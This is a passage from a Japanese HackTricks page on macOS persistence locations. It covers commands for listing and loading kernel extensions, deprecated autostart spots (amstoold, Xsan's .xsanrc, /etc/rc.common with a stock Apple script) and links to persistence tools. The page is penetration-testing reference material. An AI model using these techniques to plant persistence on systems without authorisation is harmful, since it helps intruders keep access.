* サードパーティ製ソフトウェアによってインストールされたKEXTファイル

現在ロードされているkextファイルをリストアップすることができます:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
詳細については、[**カーネル拡張機能をチェックしてください**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers)。

### ~~amstoold~~

解説: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### 位置

* **`/usr/local/bin/amstoold`**
* ルート権限が必要

#### 説明と悪用

明らかに、`/System/Library/LaunchAgents/com.apple.amstoold.plist`からの`plist`は、XPCサービスを公開しながらこのバイナリを使用していました...問題は、バイナリが存在しなかったため、そこに何かを配置し、XPCサービスが呼び出されるときにバイナリが呼び出されることができました。

私のmacOSではこれを見つけることができなくなりました。

### ~~xsanctl~~

解説: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### 位置

* **`/Library/Preferences/Xsan/.xsanrc`**
* ルート権限が必要
* **トリガー**: サービスが実行されるとき（まれ）

#### 説明と悪用

このスクリプトを実行することはあまり一般的ではないようで、私のmacOSでも見つけることができませんでした。詳細については、解説をご覧ください。

### ~~/etc/rc.common~~

{% hint style="danger" %}
**これは現代のMacOSバージョンでは機能しません**
{% endhint %}

ここには、**起動時に実行されるコマンドを配置することも可能です。** 通常のrc.commonスクリプトの例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## 持続性の技術とツール

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を使用して、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見る
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする**
* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する

</details>
